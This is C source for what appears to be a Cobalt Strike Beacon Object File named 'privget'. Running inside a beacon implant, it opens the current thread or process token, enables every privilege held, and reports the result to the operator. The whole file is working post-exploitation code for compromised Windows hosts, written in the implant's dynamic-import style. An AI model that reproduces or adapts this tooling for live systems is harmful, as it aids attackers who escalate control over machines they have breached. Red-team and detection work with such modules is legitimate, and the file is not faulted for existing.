#include <windows.h>
#include "beacon.h"
#include "bofdefs.h"
#include "../tkerror.h"

VOID go(IN PCHAR Buffer, IN ULONG Length)
{
    HANDLE           hToken       = NULL;
    DWORD            tokenInfoLen = 0;
    PTOKEN_PRIVILEGES pTokPriv    = NULL;
    DWORD            dwError      = 0;
    char             errMsg[256];
    DWORD            i            = 0;
    DWORD            privCount    = 0;

    /* Open thread token first; silent fallback to process token if not impersonating */
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(),
                                  TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
                                  TRUE, &hToken))
    {
        if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
                                       TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES,
                                       &hToken))
        {
            dwError = KERNEL32$GetLastError();
            TkErrorMessage(dwError, errMsg, sizeof(errMsg));
            BeaconPrintf(CALLBACK_ERROR, "[-] privget: OpenProcessToken failed: %s\n", errMsg);
            return;
        }
    }

    /* Pass 1: size query — expected to fail with ERROR_INSUFFICIENT_BUFFER */
    ADVAPI32$GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLen);

    pTokPriv = (PTOKEN_PRIVILEGES) KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(),
                                                       HEAP_ZERO_MEMORY, tokenInfoLen);
    if (!pTokPriv)
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] privget: HeapAlloc failed\n");
        NTDLL$NtClose(hToken);
        return;
    }

    /* Pass 2: fill */
    if (!ADVAPI32$GetTokenInformation(hToken, TokenPrivileges, pTokPriv,
                                      tokenInfoLen, &tokenInfoLen))
    {
        dwError = KERNEL32$GetLastError();
        TkErrorMessage(dwError, errMsg, sizeof(errMsg));
        BeaconPrintf(CALLBACK_ERROR, "[-] privget: GetTokenInformation failed: %s\n", errMsg);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTokPriv);
        NTDLL$NtClose(hToken);
        return;
    }

    /* Enable all privileges */
    for (i = 0; i < pTokPriv->PrivilegeCount; i++)
        pTokPriv->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;

    privCount = pTokPriv->PrivilegeCount;

    ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, pTokPriv, tokenInfoLen, NULL, NULL);
    dwError = KERNEL32$GetLastError();

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTokPriv);
    NTDLL$NtClose(hToken);

    if (dwError != 0 && dwError != 1300)
    {
        TkErrorMessage(dwError, errMsg, sizeof(errMsg));
        BeaconPrintf(CALLBACK_ERROR, "[-] privget: AdjustTokenPrivileges failed: %s\n", errMsg);
        return;
    }

    if (dwError == 1300)
        BeaconPrintf(CALLBACK_OUTPUT, "[!] privget: not all privileges could be enabled.\n");

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Enabled %lu privileges.\n", (unsigned long) privCount);
}
